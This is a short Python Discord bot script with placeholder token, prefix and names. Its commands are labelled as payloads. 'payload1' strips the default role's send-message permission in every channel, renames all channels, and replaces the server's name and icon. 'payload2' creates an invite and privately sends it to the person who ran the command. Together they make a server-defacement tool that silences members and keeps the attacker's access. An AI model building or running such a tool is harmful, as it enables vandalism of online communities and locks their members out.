import discord
import asyncio
from discord.utils import find
from discord.ext import commands
import discord.utils

channel = []
text_channel_list = []
#Intents, needed to read messages.
intents = discord.Intents.all()
intents.messages = True
bot = commands.Bot(command_prefix='[Bot prefix goes here]', intents=intents)


#Bot status set here.
@bot.event
async def on_ready():
    await bot.change_presence(status = discord.Status.online, activity=discord.Game("[bot status message here]"))

#Testing Command    
@bot.command()
async def test(ctx):
    await ctx.send("The bot works.")
# payload 1, sends a message, and then changes the things.
@bot.command()
async def payload1(ctx):
    for channel in ctx.guild.channels:
        await channel.set_permissions(ctx.guild.default_role,send_messages=False)
        await channel.edit(name="[channel/catagory name]")
    await asyncio.sleep(1)
    with open('[server picture reference here.]', 'rb') as f:
        icon = f.read()
    await ctx.guild.edit(name = "[name]", icon = icon)
@bot.command()
async def payload2(ctx, arg):
    invite = await ctx.channel.create_invite()
    #Backup option, for if the invite doesn't send.
    print(invite)
    #sends an invite to the person who did it.
    await ctx.author.send(invite)
#Input your bot's token here.
bot.run('[Token goes here!]')